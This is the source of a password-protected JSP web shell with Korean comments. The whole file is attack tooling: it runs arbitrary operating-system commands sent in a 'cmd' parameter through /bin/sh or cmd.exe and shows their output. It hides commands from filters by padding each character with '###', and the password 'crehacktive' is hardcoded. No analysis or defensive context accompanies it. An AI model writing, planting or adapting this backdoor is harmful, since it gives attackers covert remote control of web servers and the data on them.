<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*" %>
<%
request.setCharacterEncoding("UTF-8");
%>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Document</title>
	<style>
		table{
			border: 1px solid black;
			background-color: black;
		}
		td{
			color: white;
			font-size: 12px;

		}
	</style>
</head>
<body>


<%

String cmd = request.getParameter("cmd");
Process ps = null;
BufferedReader br = null;
String line = "";
String result = "";
String now_page = request.getServletPath();
String password = "crehacktive";
String input_password = request.getParameter("password");
String id = (String)session.getAttribute("webshell_id");
String os = System.getProperty("os.name").toLowerCase();
String shell = "";


try{
	if(id == null && input_password == null){
		%>
		<form action="<%=now_page%>" method="POST">
		<input type="password" name="password">
		<input type="submit" value="AUTH">
		</form>
		<%
		return;
	}
	else if(id == null && input_password != null){
		if(password.equals(input_password)){
			session.setAttribute("webshell_id", "crehacktive");
			response.sendRedirect(now_page);
		}
		else{
			response.sendRedirect(now_page);
		}
	}

	if(os.indexOf("win") == -1){
		//window 가 아닐 경우
		shell = "/bin/sh -c";
	}
	else{
		shell = "cmd.exe /c";
	}

	if(cmd != null){
	cmd = cmd.replace("###", "");
	ps = Runtime.getRuntime().exec(shell + cmd);
	br = new BufferedReader(new InputStreamReader(ps.getInputStream()));

	while((line = br.readLine()) != null){//시스템 명령어를 통한 결과값을 한줄 씩 읽음, 문자열이 없지 않는 이상 계속 한줄씩 추가됨. 빈공간도 문자열이 있는것임, NULL이 아님 그래서 빈 공간도 추가됨.
	result += line + "<br>";
}

//result += br.readLine();

ps.destroy();
	}
}
finally{
	if(br != null) br.close();
}
%>
<script>
	document.addEventListener("keydown", (event)=>{if(event.keyCode === 13){cmdRequest()}});
	function cmdRequest(){
		var frm = document.frm;
		var cmd = frm.cmd.value;
		var enc_cmd = "";

		for(i=0; i<cmd.length; i++){
			enc_cmd += cmd.charAt(i) + "###";
		}

		frm.cmd.value = enc_cmd;
		frm.action = "<%=now_page%>";
		frm.submit();
		}
</script>
<form name="frm" methoad="POST">
	<input type="text" name="cmd">
	<input type="submit" onclick="cmdRequest()" value="EXECUTE">
</form>
<hr>
<table>
	<tr>
		<td><%=result%></td>
	</tr>
</table>
</body>
</html>